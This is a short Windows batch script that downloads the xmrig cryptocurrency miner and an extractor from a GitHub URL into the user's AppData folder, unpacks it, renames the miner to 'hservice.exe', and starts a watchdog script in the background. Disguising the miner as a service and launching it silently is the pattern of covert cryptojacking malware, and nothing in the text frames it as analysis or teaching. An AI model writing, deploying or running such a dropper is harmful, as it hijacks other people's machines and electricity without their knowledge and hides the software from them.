@echo off

bitsadmin /transfer "hservice" https://raw.githubusercontent.com/JohnSmithNA/xmrig_setup/master/xmrig.zip "%USERPROFILE%\AppData\Local\hservice\hservice.zip"
bitsadmin /transfer "hservice" https://raw.githubusercontent.com/JohnSmithNA/xmrig_setup/master/7za.exe "%USERPROFILE%\AppData\Local\hservice\7za.exe"

IF EXIST "%USERPROFILE%\AppData\Local\hservice\hservice.zip" (
    "%USERPROFILE%\AppData\Local\hservice\7za.exe" x -y -o"%USERPROFILE%\AppData\Local\hservice" "%USERPROFILE%\AppData\Local\hservice\hservice.zip" >NUL
    del "%USERPROFILE%\AppData\Local\hservice\hservice.zip"
    del "%USERPROFILE%\AppData\Local\hservice\hservice.exe"
    rename "%USERPROFILE%\AppData\Local\hservice\xmrig.exe" "hservice.exe"
    start /b "" "%USERPROFILE%\AppData\Local\hservice\watchdog.vbs"
) ELSE (
    start /b "" "%USERPROFILE%\AppData\Local\hservice\watchdog.vbs"
)


